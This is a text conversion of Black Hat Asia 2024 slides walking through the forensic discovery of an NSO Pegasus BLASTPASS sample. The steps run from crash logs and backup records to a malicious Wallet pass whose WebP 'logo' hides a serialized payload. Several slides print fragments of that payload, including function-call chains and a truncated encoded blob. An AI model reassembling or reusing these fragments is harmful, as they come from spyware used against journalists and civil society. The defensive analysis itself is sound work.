---
title: "You Shall Not PASS - Analysing a NSO iOS Spyware Sample"
speakers: ["Matthias Frielingsdorf"]
conference: "Black Hat"
conference_full: "Black Hat ASIA 2024"
edition: "ASIA"
year: 2024
source_pdf: "BlackHat ASIA 2024-Slides/Matthias Frielingsdorf-You Shall Not PASS - Analysing a NSO iOS Spyware Sample.pdf"
pages: 163
sha256: "65c147fc908408e82f3c61fe5a42811b1e8f91b8fe2de16aec23767a2496ae87"
text_chars: 52637
ocr_pages: 12
has_ocr: true
redacted_secrets: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T00:50:32Z"
---
# You Shall Not PASS - Analysing a NSO iOS Spyware Sample

**Speakers:** Matthias Frielingsdorf  
**Conference:** Black Hat ASIA 2024  
**Source:** `BlackHat ASIA 2024-Slides/Matthias Frielingsdorf-You Shall Not PASS - Analysing a NSO iOS Spyware Sample.pdf` (163 pages)

## Slide 1

# You Shall not PASS

Analysing a NSO iOS Spyware Sample

Matthias Frielingsdorf

#BHASIA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
G ~—
_ blackhat
| ASIA 2024
1k 18-19, 2024 | f ,
BRIEFINGS | - SM
You Shall not PASS
Analysing a NSO iOS Spyware Sample
%\
Matthias Frielingsdorf
#BHASIA @BlackHatEvents
```

## Slide 2

Matthias Frielingsdorf VP of Research at iVerify

iOS Malware & Mobile Device Security

@helthydriver

# BHASIA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Q
biseahat Verity.
Matthias Frielingsdorf
VP of Research at iVerify
iOS Malware & Mobile Device Security
wi (3) @helthydriver
#BHASIA @BlackHatEvents
```

## Slide 3

##### **September 7th 2023**

# BHASIA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
ASIA 2024
September 7th 2023
iOS 16.6.1 and iPadOS 16.6.1
Released September 7, 2023
ImagelO
Available for: iPhone 8 and later, iPad Pro (all models), iPad Air 3rd generation and later, iPad 5th
generation and later, and iPad mini 5th generation and later
Impact: Processing a maliciously crafted image may lead to arbitrary code execution. Apple is aware of a
report that this issue may have been actively exploited.
Description: A buffer overflow issue was addressed with improved memory handling.
CVE-2023-41064: The Citizen Lab at The University of Toronto’s Munk School
Wallet
Available for: iPhone 8 and later, iPad Pro (all models), iPad Air 3rd generation and later, iPad 5th
generation and later, and iPad mini 5th generation and later
Impact: A maliciously crafted attachment may result in arbitrary code execution. Apple is aware of a report
that this issue may have been actively exploited.
Description: A validation issue was addressed with improved logic.
CVE-2023-41061: Apple
```

## Slide 4

##### **2023 Pegasus BLASTPASS Exploit**

iOS 9 iOS 10 iOS 11 iOS 12 iOS 13 iOS 14 iOS 15 iOS 16 Infection Vector Detection & Technical Analysis Attribution iMessage Citizen Lab NSO IOCs Targets Detection CVEs CVE-2023-41061 PassKit USA Based Forensic Analysis CVE-2023-41064 Attachment Civil Society

iOS 16

# BHASIA   @BlackHatEvents

## Slide 5

##### **Some BlastPass Reports**

Apple - About the security content of iOS 16.6.1 and iPadOS 16.6.1 https://support.apple.com/en-us/106361

Amnesty International - Forensic appendix: Pegasus 0-Click… https://securitylab.amnesty.org/latest/2023/12/pegasus-zero-click-exploit-threatens-journalists-in-india/ CitzenLab - BLASTPASS - September 7th 2023

https://citizenlab.ca/2023/09/blastpass-nso-group-iphone-zero-click-zero-day-exploit-captured-in-the-wild/

iVerify - Clipping Wings: Our Analysis of a Pegasus Spyware Sample https://www.iverify.io/post/clipping-wings-our-analysis-of-a-pegasus-spyware-sample

# BHASIA   @BlackHatEvents

## Slide 6

## **Today**

# BHASIA   @BlackHatEvents

## Slide 7

😕

## **No 0-Days revealed**

# BHASIA   @BlackHatEvents

## Slide 8

## **No weaponised sample leaked!**

# BHASIA   @BlackHatEvents

## Slide 9

## **But**

# BHASIA   @BlackHatEvents

## Slide 10

**A journey on how we discovered and analyzed the latest sample of NSO’s Pegasus Exploit!**

# BHASIA   @BlackHatEvents

## Slide 11

## **Today**

- **1** Detecting iOS Malware with Forensic Analysis

- **2** Show the Steps which are necessary to unveil the final Payload

- **3** Discuss some Indicators of Compromise for this specific sample.

# BHASIA   @BlackHatEvents

## Slide 12

# BHASIA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
—-
hat : WS SS ronost
ASIA 2024 by
```

## Slide 13

## **How to do Forensic Analysis?**

# BHASIA   @BlackHatEvents

## Slide 14

##### **Previous iOS Malware Detection Talks**

2022

OBTSv5 In Walled Gardens be care Fun of Poisoned Apples https://objectivebythesea.org/v5/talks.html#Speaker_23

2023

HITB AMS Poisoned Apples - Current state of iOS Malware Detection

https://conference.hitb.org/hitbsecconf2023ams/session/poisoned-apples-current-state-of-ios-malware-detection/

OBTSv6 Poisoned 🍎🍏 - How do we find them?

https://objectivebythesea.org/v6/talks.html#Speaker_28

# BHASIA   @BlackHatEvents

## Slide 15

## **October 2023 - Customer contact**

# BHASIA   @BlackHatEvents

## Slide 16

## **Potential compromised device**

# BHASIA   @BlackHatEvents

## Slide 17

## **Data Sources in this Case**

Crashlogs iTunes Backups Telemetry Data

# BHASIA   @BlackHatEvents

## Slide 18

## **Data Sources**

Crashlogs iTunes Backups Telemetry Data

## **Analysis Tools Scripts**

###### **MVT**

###### **Scripts**

# BHASIA   @BlackHatEvents

## Slide 19

##### **iOS Malware Analysis - Tools**

Crashlogs - Apple Documentation https://developer.apple.com/documentation/xcode/analyzing-a-crash-report

Backups - Amnesty Security Lab Mobile Verification Toolkit https://docs.mvt.re/en/latest/

# BHASIA   @BlackHatEvents

## Slide 20

## **Example Suspicious Activities**

- Process starting from /private/var/tmp

- Process doing Network Calls

- Files wrote to Disk

- Process crashes repeatedly

# BHASIA   @BlackHatEvents

## Slide 21

##### **Crashlogs**

**09:30 - 10:00 25x homed Crashes 10:00 - 10:30** ☕ **10:30 - 11:00 35 MessagesBlastDoorService Crashes**

# BHASIA   @BlackHatEvents

## Slide 22

## **Thats suspicious**

# BHASIA   @BlackHatEvents

## Slide 23

##### **Homed Crash**

**open -a "Console.app" Crashes/homed/homed-2023-0*…*ips**

Hardware Model iPhone14,2 Process homed [33317] Path /System/Library/PrivateFrameworks/HomeKitDaemon.framework/Support/homed Identifier homed Parent Process launchd [1] Date/Time 2023-0*..* +0100 Launch Time 2023-0*..* +0100 OS Version iPhone OS 16.6 (20G75)

Exception Type EXC_CRASH (SIGABRT) Termination Reason SIGNAL 6 Abort trap: 6 Terminating Process homed [33317]

# BHASIA   @BlackHatEvents

## Slide 24

##### **MessagesBlastDoorService Crash**

**open -a "Console.app" Crashes/MessagesBlastDoorService/MessagesBlastDoorService-2023-0*..*.ips**

Hardware Model iPhone14,2 Process MessagesBlastDoorService [34002] Path /System/Library/PrivateFrameworks/MessagesBlastDoorSupport.framework/ XPCServices/MessagesBlastDoorService.xpc/MessagesBlastDoorService Identifier com.apple.MessagesBlastDoorService Parent Process launchd [1] Date/Time 2023-0*..* +0100 Launch Time 2023-0*..* +0100 OS Version iPhone OS 16.6 (20G75)

Exception Type EXC_BAD_ACCESS (SIGBUS) Exception SubType KERN_PROTECTION_FAILURE at 0x000000016d2a7f08 Terminating Process exc handler [34002] Triggered by Thread 0

# BHASIA   @BlackHatEvents

## Slide 25

##### **MessagesBlastDoorService Crash**

**open -a "Console.app" Crashes/MessagesBlastDoorService/MessagesBlastDoorService-2023-0*…***

- 0   CoreFoundation

   - 0x1c191e644 __CFStringEncodeByteStream + 76

- 1   Foundation 0x1bbbdfeb0 -[NSString(NSStringOtherEncodings) getBytes:maxLength:usedLength:encoding:options:range:remainingRange:] + 260

- 2   CoreFoundation 0x1c1914c70 -[NSTaggedPointerString

- getBytes:maxLength:usedLength:encoding:options:range:remainingRange:] + 100

- 3   Foundation 0x1bbbdec9c -[NSString(NSStringOtherEncodings) getCString:maxLength:encoding:] + 136

- 4   Foundation 0x1bbbdeab8 NSClassFromString + 76

- 5   Foundation 0x1bbbfe838 _decodeObjectBinary + 1648

- 6   Foundation 0x1bbbd748c -[NSKeyedUnarchiver _decodeArrayOfObjectsForKey:] + 1592 7   Foundation 0x1bbbd6a88 -[NSArray(NSArray) initWithCoder:] + 152

- 8   Foundation 0x1bbbfeb4c _decodeObjectBinary + 2436

- 9   Foundation 0x1bbbd748c -[NSKeyedUnarchiver _decodeArrayOfObjectsForKey:] + 1592 10  Foundation 0x1bbbd6a88 -[NSArray(NSArray) initWithCoder:] + 152

# BHASIA   @BlackHatEvents

## Slide 26

##### **MessagesBlastDoorService Crash**

**open -a "Console.app" Crashes/MessagesBlastDoorService/MessagesBlastDoorService-2023-0*…***

- 11  Foundation 0x1bbbfeb4c _decodeObjectBinary + 2436

- 12  Foundation 0x1bbbd748c -[NSKeyedUnarchiver _decodeArrayOfObjectsForKey:] + 1592

- 13  Foundation 0x1bbbd6a88 -[NSArray(NSArray) initWithCoder:] + 152

- 14  Foundation 0x1bbbfeb4c _decodeObjectBinary + 2436

- 15  Foundation 0x1bbbd748c -[NSKeyedUnarchiver _decodeArrayOfObjectsForKey:] + 1592

- 16  Foundation 0x1bbbd6a88 -[NSArray(NSArray) initWithCoder:] + 152

- 17  Foundation 0x1bbbfeb4c _decodeObjectBinary + 2436

- 18  Foundation 0x1bbbd748c -[NSKeyedUnarchiver _decodeArrayOfObjectsForKey:] + 1592 19  Foundation 0x1bbbd6a88 -[NSArray(NSArray) initWithCoder:] + 152

- *…*

   - *…*

- 507  Foundation 0x1bbbd748c -[NSKeyedUnarchiver _decodeArrayOfObjectsForKey:] + 1592

- 508  Foundation 0x1bbbd6a88 -[NSArray(NSArray) initWithCoder:] + 152

- 509  Foundation

510  Foundation

- 0x1bbbd6a88 _decodeObjectBinary + 2436

- 0x1bbbfeb4c  -[NSKeyedUnarchiver _decodeArrayOfObjectsForKey:] + 1592

# BHASIA   @BlackHatEvents

## Slide 27

## **Thats suspicious**<sup>**2**</sup>

# BHASIA   @BlackHatEvents

## Slide 28

## **Lets quickly check the Backup!**

# BHASIA   @BlackHatEvents

## Slide 29

###### **Backup**

###### **MVT Extract DataUsage.sqlite - 2023-0*…* - WWAN Data**

- 12:***** IMTransferAgent/com.apple.datausage.messages IN: 32561646.0, OUT: 621714.0 12:***** IMTransferAgent/com.apple.datausage.messages IN: 32561646.0, OUT: 621714.0 12:***** IMTransferAgent/com.apple.datausage.messages IN: 32561646.0, OUT: 621714.0 12:***** IMTransferAgent/com.apple.datausage.messages 12:***** IMTransferAgent/com.apple.datausage.messages 12:***** IMTransferAgent/com.apple.datausage.messages

# BHASIA   @BlackHatEvents

## Slide 30

###### Backup

###### **MVT Extract Manifest.db - 2023-0*…* - Files**

12:***** Library/SMS/Attachments/a8/08/*…*/sample.pkpass 12:***** Library/SMS/Attachments/a8/08/*…* 12:***** Library/SMS/Attachments/a8/08

# BHASIA   @BlackHatEvents

## Slide 31

## **That’s interesting, are there more?**

# BHASIA   @BlackHatEvents

## Slide 32

###### **Backup**

###### **MVT Extract Manifest.db - 2023-0*…* - Files**

- 12:***** Library/SMS/*…*/sample.pkpass 12:***** Library/SMS/*…*/sample.pkpass

- 12:***** Library/SMS/*…*/sample.pkpass

- 12:***** Library/SMS/*…*/sample.pkpass

- 12:***** Library/SMS/*…*/sample.pkpass

- 12:***** Library/SMS/*…*/sample.pkpass

- 12:***** Library/SMS/*…*/sample.pkpass

- 12:***** Library/SMS/*…*/sample.pkpass

# BHASIA   @BlackHatEvents

## Slide 33

## **Suspicious!!!**

# BHASIA   @BlackHatEvents

## Slide 34

## **But, are those Files in the Backup?**

# BHASIA   @BlackHatEvents

## Slide 35

**Yes!** 😎 😎 😎

# BHASIA   @BlackHatEvents

## Slide 36

# BHASIA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
ASIA 2024
eae Forensic
Anal
bastpass 2 ontsts
```

## Slide 37

###### **Lets have a look!**

**ls -la sample** total 175 -rw-------@ 1 matthias staff  175233 0*…* sample.pkpass

# BHASIA   @BlackHatEvents

## Slide 38

## **So what’s a wallet pass?**

# BHASIA   @BlackHatEvents

## Slide 39

###### **Attempt Two**

###### P **You** What's apples pk.pass format?

###### **Chat GPT**

Apple's PKPass format, also known as PassKit, is the file format used for storing and distributing digital passes for Apple Wallet (formerly known as Passbook). These passes can represent various items such as boarding passes, event tickets, loyalty cards, coupons, and more.

The PKPass format is essentially a compressed archive that contains all the information needed for the pass to be displayed within Apple Wallet. This includes metadata such as the pass type, organization name, pass serial number, and expiration date, as well as graphical assets such as images and logos.

The PKPass file typically has a ".pkpass" file extension and is essentially a ZIP archive that contains JSON files for pass information, along with images and other resources required for display.

PassKit provides APIs and tools for developers to create, distribute, and manage digital passes for Apple Wallet, allowing businesses and organizations to offer convenient digital alternatives to traditional physical cards and tickets.

# BHASIA   @BlackHatEvents

## Slide 40

###### **Lets have a look!**

**file sample.pkpass**

sample.pkpass: Zip archive data, at least v2.0 to extract, compression method=deflate **ls -la sample** total 175 -rw-------@ 1 matthias staff  175233 0*…* sample.pkpass

# BHASIA   @BlackHatEvents

## Slide 41

###### **Lets have a look!**

Thats 5.8 MB!

**ls -la sample.pkpass**

total 11480 -rw-------  1 matthias-trail  staff    61653     *…*  2023 background.png -rw-------  1 matthias-trail  staff    5795842 *…*  2023 logo.png -rw-------  1 matthias-trail  staff    175         *…*  2023 manifest.json -rw-------  1 matthias-trail  staff    18           *…*  2023 pass.json -rw-------  1 matthias-trail  staff    3392       *…*  2023 signature

# BHASIA   @BlackHatEvents

## Slide 42

## **That logo is huge!**

# BHASIA   @BlackHatEvents

## Slide 43

## **Lets „file“ again**

logo Background manifest Pass Signature

**WebP**

**PNG**

**JSON JSON Data**

# BHASIA   @BlackHatEvents

## Slide 44

## **The WebP Vulnerability**

# BHASIA   @BlackHatEvents

## Slide 45

# BHASIA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
ASIA 2024
iOS 16.6.1 and iPadOS 16.6.1
Released September 7, 2023
ImagelO
Available for: iPhone 8 and later, iPad Pro (all models), iPad Air 3rd generation and later, iPad 5th
generation and later, and iPad mini 5th generation and later
Impact: Processing a maliciously crafted image may lead to arbitrary code execution. Apple is aware of a
report that this issue may have been actively exploited.
Description: A buffer overflow issue was addressed with improved memory handling.
CVE-2023-41064: The Citizen Lab at The University of Toronto’s Munk School
Wallet
Available for: iPhone 8 and later, iPad Pro (all models), iPad Air 3rd generation and later, iPad 5th
generation and later, and iPad mini 5th generation and later
Impact: A maliciously crafted attachment may result in arbitrary code execution. Apple is aware of a report
that this issue may have been actively exploited.
Description: A validation issue was addressed with improved logic.
CVE-2023-41061: Apple
```

## Slide 46

##### **The WebP Vulnerability**

###### Isosceles

The WebP 0day https://blog.isosceles.com/the-webp-0day/

LiveOverflow

A Vulnerability to Hack The World - CVE-2023-4863 https://www.youtube.com/watch?v=lAyhKaclsPM

Finding The .webp Vulnerability in 8s (Fuzzing with AFL++) https://www.youtube.com/watch?v=PJLWlmp8CDM

Ian Beer

OffensiveCon 24 - May 10th-11th BLASTING PAST WEBP https://www.offensivecon.org/speakers/2024/ian-beer.html

# BHASIA   @BlackHatEvents

## Slide 47

## **Lets take a closer look**

**4**

# BHASIA   @BlackHatEvents

## Slide 48

## **Whats the best tool for Malware Analysis?**

# BHASIA   @BlackHatEvents

## Slide 49

## **Strings!**

# BHASIA   @BlackHatEvents

## Slide 50

##### **First try Strings!**

###### **strings logo.png**

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

# BHASIA   @BlackHatEvents

## Slide 51

##### **Second try Strings!**

###### **strings logo.png | less**

RIFF WEBPVP8X *…* bplist00 *…* _NSCallStackArray stringWithUTF8String: sel_registerName objc_msgSend NSClassFromString *…* dlopen memcpy strtol alloc class_getMethodImplementation

{FUNCTION(FUNCTION(FUNCTION(CAST('NSThread', 'Class'), 'currentThread'), 'threadDictionary'), 'setObject:forKey:', FUNCTION(…

# BHASIA   @BlackHatEvents

## Slide 52

# BHASIA   @BlackHatEvents

## Slide 53

## **Let’s extract this bplist file!**

# BHASIA   @BlackHatEvents

## Slide 54

#### **dd if=logo.png skip=1170 bs=1 > logo.plist**

# BHASIA   @BlackHatEvents

## Slide 55

##### **What’s a BPLIST?**

> P **You** What are command lines tools I can use to view a bplist file? **Chat GPT**

**plutil**

*…*

plutil -p path/to/your/file.bplist

**PlistBuddy**

***…***

/usr/libexec/PlistBuddy -c "Print" path/to/your/file.bplist

# BHASIA   @BlackHatEvents

## Slide 56

##### **Second try Strings!**

**plutil -p logo.plist | less**

{

"S5bA" => [

- 0 => <CFKeyedArchiverUID 0x6000005c7280 [0x1de0a3a20]>{value = 0}

- 1 => [

- 0 => <CFKeyedArchiverUID 0x6000005c70c0 [0x1de0a3a20]>{value = 0}

- 1 =>

„AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA *…*

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAA“

# BHASIA   @BlackHatEvents

## Slide 57

##### **Second try Strings!**

**plutil -p logo.plist**

*…* 113052 => 36028797018965100 113053 => 36028797018964917 113054 => 36028797018964732 113055 => 36028797018964549 113056 => 36028797018964364 113057 => 36028797018964181 113058 => 36028797018963996 113059 => 36028797018965340 113060 => 36028797018965157 ]

"SWxJ" => <CFKeyedArchiverUID 0x6000033671a0 [0x1de0a3a20]>{value = 0}

# BHASIA   @BlackHatEvents

## Slide 58

##### **Second try Strings!**

###### **/usr/libexec/PlistBuddy -c "Print" logo.plist | less**

Dict { SWxJ = Unprintable Data SHVN = Dict { SWxJ = Unprintable Data SHVN = Dict { SWxJ = Unprintable Data SHVN = Unprintable Data S94R = SRYR = }*…* S2dp = Dict { SWxJ = Unprintable Data SHVN = S94R = Array { Unprintable Data } } *…*

# BHASIA   @BlackHatEvents

## Slide 59

##### **Second try Strings!**

###### **/usr/libexec/PlistBuddy -c "Print" logo.plist**

- *…*

1??W??1x+?V??1??W`?3p??W?\?x+?V??1??W??1x+?V?1??WH?1???Wȋ3p??W??1??W?\?x+??1??W?TcWx+?VH? 1??W0?3p??Wx?1???W??1??W?\?x+?V?1??W??1x+?V??3p??W??1??Wh?1x+?VX?1??W??1???W(?1??W?3p??W? \?x+?Vh?1??W??1x+?V??1??W??1???Wh?3p??W??1??W??1x+?V?r3??W?\?x+?V0s3??WЍ3p??W??1x+?Vps3??W? r3???Wt3??W?\?x+?V8?3p??W@t3??W??1x+?V?t3??W?r3x+?V?t3??W??3p??W?s3???Whu3??W?\?x+?V?u3??W?? 1x+??3p??W?u3??Wu3???Wxv3??W?\?x+?V?v3??Wp?3p??W??1x+?V8w3??W8u3x+?Vxw3??W?s3x+?V؏3p??W? v3??W(v3???W0x3??W?\?x+?Vpx3??W@?3p??W?TcWx+?V?x3??W?w3???W@y3??W?\?x+?V??3p??W?y3?? Wx3x+?V?y3??W?x3???Wz3??W?3p??W?x3F??z3??Wy3x+?VHz3??W@z3x+?Vx?3p??W0{3??W?\?x+?Vp{3??W? TcWx+?V?{3??W??3p??W?z3???W@|3??W?\?x+?V?|3??W{3x+?VH?3p??W?|3??W?{3???W}3??W?{3F??}3??W?? 3p??W|3x+?V@}3??W@z3x+?V(~3??W?\?x+?V?3p??Wh~3??W??1x+?V?~3??W?}3???W83??W??3p??WHv3x+? Vx3??W?\?x+?V?3??W??1x+?V?3p??W8?3??W?}3x+?V?3??W?~3???W

} Array { Unprintable Data

} }

# BHASIA   @BlackHatEvents

## Slide 60

😕

# BHASIA   @BlackHatEvents

## Slide 61

## **We need to understand this better!**

# BHASIA   @BlackHatEvents

## Slide 62

## **bplist ~ NSKeyedArchiver**

# BHASIA   @BlackHatEvents

## Slide 63

##### **Simple NSKeyedArchiver**

Ref

Dictionary - Root Object
Root
1 2 3 … N

# BHASIA   @BlackHatEvents

## Slide 64

##### **Simple NSKeyedArchiver**

Dictionary - Root Object
Root
Ref 1 2 3 … N
Objects Array Dictionary Integer … String

# BHASIA   @BlackHatEvents

## Slide 65

##### **Simple NSKeyedArchiver**

Dictionary - Root Object
Root
Ref 1 2 3 … N
Objects Array Dictionary Integer … String
3 Key 8 1 „HelloWorld“
3 Key 9
5
Array 1 Objects
6
N

# BHASIA   @BlackHatEvents

## Slide 66

##### **Simple NSKeyedArchiver**

Dictionary - Root Object

Dictionary - Root Object
Root
Keys 1 2 3 … N
Objects Array Dictionary Integer … String
3 Key 8 1 „HelloWorld“
3 Key 9
5
Array 1 Objects
6
N

# BHASIA   @BlackHatEvents

## Slide 67

## **Time for some Python Magic**

# BHASIA   @BlackHatEvents

## Slide 68

##### **Python Magic**

- **1** Import your favourite NSKeyedArchiver Lib e.g. plistlib.py

- **2** Read / Understand the Code.

- **3** 😉 Set some Breakpoints if needed.

- **4** Replace Array / Objects / Dictionaries with their Top Level Keys

- **5** Print the result

**6**

🎉

# BHASIA   @BlackHatEvents

## Slide 69

##### **Are we better off?**

###### **cat logo.plist_root.txt | less**

Parsing Object Ref: 0 -> Dictionary: ->-> Keys (1, 2, 1, 3, 1, 1, 4, 1, 5, 1, 1, 6) ->-> Keys (7, 8, 130, 166, 227, 207, 242, 130, 166, 227, 207, 242) Parsing Object Ref: 1 -> String: SWxJ Parsing Object Ref: 2 -> String: SRYR Parsing Object Ref: 3 -> String: SHVN Parsing Object Ref: 4 -> String: S69O Parsing Object Ref: 5 -> String: S94R *…*

# BHASIA   @BlackHatEvents

## Slide 70

##### **Are we better off?**

###### **cat logo.plist_root.txt**

*…* Parsing Object Ref: 260 -> UID: UID(0) Parsing Object Ref: 261 -> Array: (262, 263, 263, 263, 263, 263, 263, 263, 263, 263, 263) Parsing Object Ref: 262 -> UID: UID(0) Parsing Object Ref: 263 -> Data:

b’\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\ x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0 0\*…*

\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x 00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00

# BHASIA   @BlackHatEvents

## Slide 71

## **Yes! We are down to 264 individual objects**

# BHASIA   @BlackHatEvents

## Slide 72

##### **Some interesting ones…**

###### **Object Ref: 8**

( 9, 10,*…*,10, 11 (x15), 10, *…*, 10, 11 (x15), 10, *…*, 10, 11 (x15), 10,*…*, 11 (x15), 10,*…*10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129 )

# BHASIA   @BlackHatEvents

## Slide 73

##### **Some interesting ones…**

###### **Object Ref: 11**

-> Data:

b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80&\x00\x00\x0 1\x00\x00\x00\x1f\x00\x00\x00\x00\x00\x00\x00\x10\x00\x8bV\x02\x00\x00\x00\xb0\xc31\x16\x02\x00\x00\x00X\xe3\x01\x 00\x00\x00\x00\x00

*…*

{FUNCTION(FUNCTION(FUNCTION(CAST('NSThread', 'Class'), 'currentThread'), 'threadDictionary'), 'setObject:forKey:', FUNCTION({'eJwtlTWy7UASRBckQ0ymmPGKPTEza/Xz5s8YJ7oio63MjKou8fWCjUQpr8CeRC/8wxol1qgg1hvy/ M7Lyyk2GlV3b1JlnId5kxQ27msxE1aF07gO1uagD9h0emvODEJomOGjV7x0EB0OCo8MuUQW/ mkKoxcjfdO5Z3042k2TMaDFmE0meIEVDUS/5xi/pSG9X/

ZtR83VjaJwHKcIhqYoyhxjfV23rvcTOJFtaiWQtrXWoMVtRmx+oGnuGgyTPNTlSNRlUdTlQfjhelJM3Zbh6k8g0k5QpF9dUxr DOUeCq6wsOknHKUkrKUnHGiTzUz5udFvTcFs9d1t7/

xg2AYw8sMzcM5weNniprGpXXY0QRwxN3znxZGrw2cO47Za8HkdMVMtGXqpOxVtL+xg+ALRpVIbkZNYPirnNcIovd9AR C0tMvMxHdrO6vO7cBFgJVX5iqHjiyQ56zpwhNsT7jcBx14SYHFW1d7xihDBDNQ9BqMAVFpJ5DYNddLwyQAoSD7DsZvi ErXgwwECl2xrlnZoYr9Adg5NMT7fKQjLqCIqZrcATxV+UvNMth283C97uB4h2yWIXJvgQ9kaUFIHsS7daVtVbeHBaVLTmA QqAvWsg5Y3APYEPn5Gi4Shtz3Jq//zcVliJfrGVN3VQwi8s1Q37/uwEle/fkbm7BGe+N2hesZvk/NeNpbjHl4tcbwPLHGRCl/ WtwJ+GRqAzDYR1YSPiVxqPffhxf+BJlG6wS0g/5feaf9ptWKq1TMFnrP3tXZqp/goPIEOz5/

LRu4jwqFFRQEGw0im6iaw2+9kQmNXjn0tZuWfhlEzpOcrbssLZs

*…*

# BHASIA   @BlackHatEvents

## Slide 74

## **Thats our payload!**

# BHASIA   @BlackHatEvents

## Slide 75

##### **Some interesting ones…**

###### **Object Ref: 182**

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA *…*

